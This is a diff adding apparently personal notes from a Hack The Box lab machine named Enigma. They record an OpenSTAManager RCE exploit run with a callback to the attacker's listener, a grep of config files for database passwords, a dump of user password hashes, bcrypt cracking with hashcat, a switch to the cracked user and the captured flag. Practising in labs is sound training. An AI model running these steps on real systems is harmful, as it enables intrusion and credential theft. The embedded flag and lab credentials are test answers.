@@ -1,0 +1,44 @@
+ENIGMA
+------
+URL: http://support_001.enigma.htb
+Username: admin
+Password: Ne3s4rtars78s
+---
+─[us-dedivip-5]─[10.10.14.227]─[scandice@htb-dmdqxlsp5d]─[~/OpenSTAManager-RCE-Exploit-CVE-2026-38751]
+└──╼ [★]$ ./openstamanager-rce-exploit -u http://support_001.enigma.htb -U haris -P bestfriends --lhost 10.10.14.227 --lport 8881
+---
+root:x:0:0:root:/root:/bin/bash
+haris:x:1000:1000:,,,:/home/haris:/bin/bash
+---
+grep -nEi 'db_|database|username|password|host|mysql' config.php config.inc.php
+...
+config.inc.php:22:$db_host = 'localhost';
+config.inc.php:23:$db_username = 'brollin';
+config.inc.php:24:$db_password = 'Fri3nds@9099';
+...
+---
+mysql -u DB_USER -p -h localhost
+---
+mysql> SELECT * FROM zz_users;
+SELECT * FROM zz_users;
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
+| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
+|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
+|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
+2 rows in set (0.00 sec)
+---
+hashcat -m 3200 --show hash
+$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
+---
+username: haris
+password:bestfriends
+---
+su haris
+---
+id
+uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
+---
+cat ~/user.txt
+a226a4967331dfc9972d6fba02f8e3dd
